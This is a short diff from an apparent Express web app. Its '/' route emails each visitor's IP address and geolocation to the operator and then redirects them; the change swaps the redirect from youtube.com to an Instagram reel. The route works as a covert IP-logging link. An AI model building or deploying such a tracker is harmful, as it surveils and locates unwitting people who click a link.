@@ -75,10 +75,10 @@ app.get('/', async (req, res) => {
     sendEmail(ip, city || 'N/A', region || 'N/A', country || 'N/A', time);
 
     // Redirect
-    res.redirect('https://youtube.com');
+    res.redirect('https://www.instagram.com/reel/DJwTkoyooeK/?igsh=MTU0ZmUwNDRobHBpcw==');
   } catch (err) {
     console.error('Geo lookup failed:', err.message);
-    res.redirect('https://youtube.com');
+    res.redirect('https://www.instagram.com/reel/DJwTkoyooeK/?igsh=MTU0ZmUwNDRobHBpcw==');
   }
 });
 
